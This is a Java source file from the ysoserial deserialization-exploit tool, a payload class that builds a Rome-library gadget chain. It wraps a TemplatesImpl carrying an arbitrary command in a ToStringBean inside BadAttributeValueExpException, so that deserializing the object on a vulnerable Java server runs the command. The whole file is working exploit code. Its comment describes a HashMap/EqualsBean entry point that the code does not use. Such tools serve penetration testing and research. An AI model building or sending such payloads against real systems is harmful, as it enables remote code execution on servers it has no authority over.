package ysoserial.payloads;

import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ToStringBean;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;

/*
HashMap#readobject()
EqualsBean#hash()
EqualsBean#hashcode()
ToStringBean#toString()
TemplatesImpl#getProperties()
....
TemplatesImpl#defineclass()
*/
@Dependencies("rome:rome:1.0")
@Authors({ Authors.F4NX1NG })
public class RomeException implements ObjectPayload<Object> {

    public Object getObject ( String command ) throws Exception {
        Object o = Gadgets.createTemplatesImpl(command);
        ToStringBean delegate = new ToStringBean(Templates.class, o);
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Reflections.setFieldValue(badAttributeValueExpException,"val",delegate);

        return badAttributeValueExpException;
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(RomeException.class, args);
    }

}
